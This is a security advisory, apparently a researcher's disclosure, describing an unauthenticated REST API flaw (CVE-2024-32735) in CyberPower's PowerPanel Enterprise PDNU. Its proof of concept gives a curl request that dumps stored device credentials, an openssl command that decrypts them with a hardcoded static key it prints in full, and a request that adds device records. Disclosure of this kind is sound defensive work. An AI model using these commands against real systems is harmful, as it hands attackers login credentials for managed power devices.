# CyberPower PowerPanel Enterprise Power Device Network Utility Multiple Vulnerabilities

Critical

### Synopsis

**CVE-2024-32735 - Missing Authentication for Critical Function (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)**

An unauthenticated remote attacker can access the PDNU REST APIs. For example, the attacker can fetch sensitive information (i.e., login credentials) for devices managed by PDNU:

```
curl '<http://<target-host>>:8085/api/v1/devices'
{"status":"success","results":[{"ip":"192.168.1.123","mac":"11:22:33:44:55:66","fwversion":null,"netmask":"255.255.255.0","gateway":" \"192.168.1.1\"","usedhcp":false,"location":null,"name":null,"uptime":null,"code":null,"contact":null,"modifiedtime":null,"account":"admin","passwd":"FDA64FBAD708BA5A3CA9995A1153F4C6","iv":"90CC43284178CF848AA3CFE8C98B337C","canconn":true,"action":null,"ndtype":2}]}
```

The encrypted password used to login (i.e., SSH) to a device can be decrypted with a static key (i.e., 7ea3312f320c78447ff6fd4c51f77a8abb764b20e31aedccfe6b1854f5aa505e):

```
echo -n 'FDA64FBAD708BA5A3CA9995A1153F4C6' | xxd -p -r  | openssl aes-256-cbc -d -K 7ea3312f320c78447ff6fd4c51f77a8abb764b20e31aedccfe6b1854f5aa505e -iv 90CC43284178CF848AA3CFE8C98B337C
Password123
```

Note that we do not a CyberPower device to be added to PDNU.  We simulate "adding a device manually" with:

a. Add a row to the devicesecret table in mcu.db

```
curl -i -X PUT -H 'Content-Type:application/json' -d '{"ip":"192.168.1.123","mac":"11:22:33:44:55:66","cmd":"submit_after_dry_run","acc":"admin","passwd":"Password123","connectionstatus":true}' "<http://<target-host>>:8085/api/v1/devices"
```

b. Using the PDNU web UI, import a file with the following content, this would add a row to the rmcdevice table

```
"Deivce Type","MAC Address","Version","Account","IP Address","DHCP","Time","Result","Up Time","Name","Location","Subnet Mask","Gateway"
"2","11:22:33:44:55:66","2.2.7.0","","192.168.1.123","false", "1545027013","101","1348247500","PDU30SWT17ATNET","Server Room","255.255.255.0", "192.168.1.1"

```
